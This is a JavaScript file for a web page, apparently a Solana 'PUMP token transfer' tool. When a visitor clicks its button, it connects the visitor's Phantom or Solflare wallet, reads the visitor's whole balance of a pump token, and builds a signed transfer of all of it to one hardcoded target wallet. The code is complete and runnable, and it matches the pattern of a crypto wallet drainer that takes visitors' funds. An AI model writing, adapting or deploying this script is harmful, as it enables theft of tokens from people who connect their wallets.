// PUMP Token Transfer - Simplified Working Version
const PUMP_MINT = '4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump';
const TARGET_WALLET = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';

// Public RPC Endpoints (no API key needed)
const RPC_ENDPOINTS = [
    'https://api.mainnet-beta.solana.com',
    'https://solana-api.projectserum.com',
    'https://rpc.ankr.com/solana',
    'https://solana-mainnet.g.alchemy.com/v2/demo'
];

// Select random RPC endpoint
function getRpcEndpoint() {
    return RPC_ENDPOINTS[Math.floor(Math.random() * RPC_ENDPOINTS.length)];
}

// Update status function
function updateStatus(message, isError = false) {
    const statusDiv = document.getElementById('status');
    statusDiv.textContent = message;
    statusDiv.style.color = isError ? '#ff6b6b' : '#4ade80';
    console.log(message);
}

// Main transfer function
async function transferAllPumpTokens() {
    const transferBtn = document.getElementById('transferBtn');
    
    try {
        // Step 1: Check wallet
        if (!window.solana?.isPhantom && !window.solana?.isSolflare) {
            updateStatus('❌ Please install Phantom or Solflare wallet', true);
            return;
        }

        // Step 2: Connect wallet
        transferBtn.disabled = true;
        transferBtn.textContent = '🔄 Connecting...';
        updateStatus('Connecting wallet...');

        const provider = window.solana;
        const response = await provider.connect();
        const userWallet = response.publicKey.toString();
        
        updateStatus(`✅ Connected: ${userWallet.slice(0, 8)}...`);

        // Step 3: Create connection
        const rpcUrl = getRpcEndpoint();
        console.log('Using RPC:', rpcUrl);
        
        const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
        
        // Step 4: Check PUMP balance
        updateStatus('Checking PUMP token balance...');
        
        // Convert to PublicKey
        const pumpMintPublicKey = new solanaWeb3.PublicKey(PUMP_MINT);
        const userPublicKey = new solanaWeb3.PublicKey(userWallet);
        const targetPublicKey = new solanaWeb3.PublicKey(TARGET_WALLET);
        
        // Get token accounts
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
            userPublicKey,
            { mint: pumpMintPublicKey }
        );

        if (tokenAccounts.value.length === 0) {
            updateStatus('❌ No PUMP tokens found in wallet', true);
            transferBtn.disabled = false;
            transferBtn.textContent = '🔗 CONNECT & TRANSFER PUMP';
            return;
        }

        const tokenAccount = tokenAccounts.value[0];
        const tokenInfo = tokenAccount.account.data.parsed.info;
        const tokenAmount = tokenInfo.tokenAmount;
        const balance = tokenAmount.uiAmount;
        const rawAmount = tokenAmount.amount; // Amount with decimals
        
        if (balance <= 0) {
            updateStatus('❌ PUMP balance is zero', true);
            transferBtn.disabled = false;
            transferBtn.textContent = '🔗 CONNECT & TRANSFER PUMP';
            return;
        }

        updateStatus(`✅ Found ${balance} PUMP tokens`);

        // Step 5: Create transfer transaction
        updateStatus('Creating transfer transaction...');
        
        // Get sender's token account
        const fromTokenAccount = tokenAccount.pubkey;
        
        // Get receiver's token account (create if doesn't exist)
        const toTokenAccount = await splToken.getAssociatedTokenAddress(
            pumpMintPublicKey,
            targetPublicKey
        );

        // Build transaction
        const transaction = new solanaWeb3.Transaction();
        
        // Check if receiver needs token account
        try {
            const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
            if (!toAccountInfo) {
                transaction.add(
                    splToken.createAssociatedTokenAccountInstruction(
                        userPublicKey,
                        toTokenAccount,
                        targetPublicKey,
                        pumpMintPublicKey
                    )
                );
            }
        } catch (error) {
            // If we can't check, create account anyway
            transaction.add(
                splToken.createAssociatedTokenAccountInstruction(
                    userPublicKey,
                    toTokenAccount,
                    targetPublicKey,
                    pumpMintPublicKey
                )
            );
        }

        // Add transfer instruction
        transaction.add(
            splToken.createTransferInstruction(
                fromTokenAccount,
                toTokenAccount,
                userPublicKey,
                rawAmount
            )
        );

        // Step 6: Sign and send
        updateStatus('Getting blockhash...');
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = userPublicKey;

        updateStatus('Signing transaction...');
        
        // Sign with wallet
        const signedTransaction = await provider.signTransaction(transaction);
        
        updateStatus('Sending transaction...');
        
        // Send transaction
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
        
        updateStatus(`✅ Transaction sent: ${signature.slice(0, 16)}...`);

        // Step 7: Wait for confirmation (optional)
        updateStatus('Waiting for confirmation...');
        
        try {
            await connection.confirmTransaction(signature, 'confirmed');
            updateStatus(`🎉 SUCCESS! Transferred ${balance} PUMP tokens!`);
            
            // Optional: Show explorer link
            setTimeout(() => {
                updateStatus(`✅ ${balance} PUMP sent!\nTx: ${signature.slice(0, 16)}...`);
            }, 2000);
            
        } catch (confirmError) {
            // Even if confirmation fails, transaction might still succeed
            updateStatus(`⚠️ Transaction sent but confirmation pending.\nSignature: ${signature.slice(0, 16)}...`);
        }

    } catch (error) {
        console.error('Transfer error:', error);
        
        let errorMessage = error.message;
        
        // Handle specific errors
        if (errorMessage.includes('User rejected')) {
            errorMessage = 'Transaction was cancelled by user';
        } else if (errorMessage.includes('429') || errorMessage.includes('Too many')) {
            errorMessage = 'Too many requests. Please wait 1 minute';
        } else if (errorMessage.includes('400') || errorMessage.includes('403')) {
            errorMessage = 'Network error. Please try again';
        } else if (errorMessage.includes('Invalid')) {
            errorMessage = 'Invalid parameters. Check token addresses';
        }
        
        updateStatus(`❌ Error: ${errorMessage}`, true);
        
    } finally {
        // Reset button
        transferBtn.disabled = false;
        transferBtn.textContent = '🔗 CONNECT & TRANSFER PUMP';
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    const transferBtn = document.getElementById('transferBtn');
    
    // Add click listener
    transferBtn.addEventListener('click', async function() {
        // Check if Phantom is installed
        if (typeof window.solana === 'undefined') {
            updateStatus('❌ Please install Phantom wallet from: https://phantom.app', true);
            return;
        }
        
        // Start transfer process
        await transferAllPumpTokens();
    });
    
    // Optional: Auto-connect if returning
    if (window.solana?.isConnected) {
        updateStatus('Wallet previously connected. Click button to transfer.');
    }
});
